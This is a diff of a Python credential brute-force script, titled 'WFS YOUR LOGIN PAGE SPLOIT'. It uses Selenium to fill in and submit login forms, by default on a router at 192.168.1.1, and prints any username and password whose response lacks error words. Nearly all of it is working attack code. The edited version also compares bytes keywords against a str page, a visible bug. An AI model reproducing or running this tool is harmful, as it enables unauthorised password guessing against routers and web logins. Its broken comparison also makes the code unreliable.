@@ -14,17 +14,16 @@ BLUE = "\033[94m"
 GREEN = "\033[92m"
 RESET = "\033[0m"
 
-line1 = "__        _______ ____"
-line2 = "\ \      / /  ___/ ___| YOUR"
-line3 = " \ \ /\ / /| |_  \___ \ LOGIN"
-line4 = "  \ V  V / |  _|  ___) |PAGE"
-line5 = "   \_/\_/  |_|   |____/ SPLOIT"
+lines = [
+    "__        _______ ____",
+    "\ \      / /  ___/ ___| YOUR",
+    " \ \ /\ / /| |_  \___ \ LOGIN",
+    "  \ V  V / |  _|  ___) |PAGE",
+    "   \_/\_/  |_|   |____/ SPLOIT"
+]
 
-print(line1)
-print(line2)
-print(line3)
-print(line4)
-print(line5)
+for line in lines:
+    print(line)
 
 def colored_print(text, color):
     return f"{color}{text}{RESET}"
@@ -35,6 +34,67 @@ def get_user_input(default, prompt, color):
         return default
     return user_input
 
+def is_read_only(element):
+    return element.get_attribute("readonly") is not None
+
+def wait_for_editable_input(driver, by, value):
+    WebDriverWait(driver, 10).until(lambda d: not is_read_only(d.find_element(by, value)))
+
+def brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button):
+    try:
+        driver.get(url)
+        print(colored_print("\nPage loaded successfully", GREEN))
+
+        driver.implicitly_wait(10)
+
+        print(colored_print("Waiting for username input field to become visible...", BLUE))
+
+        username_input = WebDriverWait(driver, 10).until(
+            EC.visibility_of_element_located((username_element_type, u_name))
+        )
+        print(colored_print("Username input field found and visible", YELLOW))
+
+        # Wait for the input field to become editable
+        wait_for_editable_input(driver, username_element_type, u_name)
+
+        password_input = driver.find_element(password_element_type, p_word)
+
+        # Wait for the password input field to become editable
+        wait_for_editable_input(driver, password_element_type, p_word)
+
+        username_input.clear()
+        username_input.send_keys(username)
+        password_input.clear()
+        password_input.send_keys(password)
+
+        try:
+            submit_button = driver.find_element(button_element_type, button)
+            submit_button.click()
+            print(colored_print("Form submission successful", GREEN))
+            time.sleep(5)
+        except Exception as e:
+            print("Error clicking submit button:", e)
+
+        time.sleep(2)
+
+        driver_lower_content = driver.page_source.lower()
+        
+        if not any(item in driver_lower_content for item in expression):
+            print("\nBrute Forcing...")
+            print("[+] Username: ", username)
+            print("[+] Password: ", password)
+            print("Server Response:", driver.page_source)
+            sys.exit()
+        else:
+            print("Success condition not met")
+            print(driver_lower_content)
+            
+            found_items = [item for item in expression if item in driver_lower_content]
+            print("Found items in HTML that prevented success:", found_items)
+    except Exception as e:
+        print("Error using Selenium:", e)
+        sys.exit(1)
+
 def main():
     usage = input("Show URL usage? y/n: ")
     if usage.lower() == "y":
@@ -44,10 +104,11 @@ def main():
         print("URL format: http/https://<url>:<port>/<directory>/<login-file>")
     else:
         pass
+
     url = get_user_input('http://192.168.1.1', "Router's ip (default: http://192.168.1.1) : ", RESET)
     print("\r")
 
-    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}  #you can add your own login page errors messages here
+    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}  # Add your own error messages here
 
     u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
     username_element_type = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)
@@ -114,63 +175,6 @@ def main():
         print("\n\033[91mExiting...\033[0m")
     finally:
         driver.quit()
-
-def brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button):
-    try:
-        driver.get(url)
-        print(colored_print("\nPage loaded successfully", GREEN))
-
-        driver.implicitly_wait(10)
-
-        page_loaded = driver.execute_script("return document.readyState") == "complete"
-        if not page_loaded:
-            print("Page not fully loaded. Retrying in 2 seconds...")
-            time.sleep(2)
-            page_loaded = driver.execute_script("return document.readyState") == "complete"
-            if not page_loaded:
-                print("Page still not fully loaded. Exiting...")
-                sys.exit(1)
-            else:
-                print("Page loaded successfully after waiting.")
-
-        print(colored_print("Waiting for username input field to become visible...", BLUE))
-
-        username_input = WebDriverWait(driver, 10).until(
-            EC.visibility_of_element_located((username_element_type, u_name))
-        )
-        print(colored_print("Username input field found and visible", YELLOW))
-
-        password_input = driver.find_element(password_element_type, p_word)
-
-        username_input.clear()
-        username_input.send_keys(username)
-        password_input.clear()
-        password_input.send_keys(password)
-
-        try:
-            submit_button = driver.find_element(button_element_type, button)
-            submit_button.click()
-            print(colored_print("Form submission successful", GREEN))
-            time.sleep(5)
-        except Exception as e:
-            print("Error clicking submit button:", e)
-
-        time.sleep(2)
-
-        driver_lower_content = driver.page_source.lower().encode('utf-8')
-
-        if not any(item in driver_lower_content for item in expression):
-            print("\nBrute Forcing...")
-            print("[+] Username: ", username)
-            print("[+] Password: ", password)
-            print("Server Response:", driver.page_source.encode('utf-8'))
-            sys.exit()
-        else:
-            print("Success condition not met")
-            print(driver_lower_content)
-    except Exception as e:
-        print("Error using Selenium:", e)
-        sys.exit(1)
 
 if __name__ == '__main__':
     main()
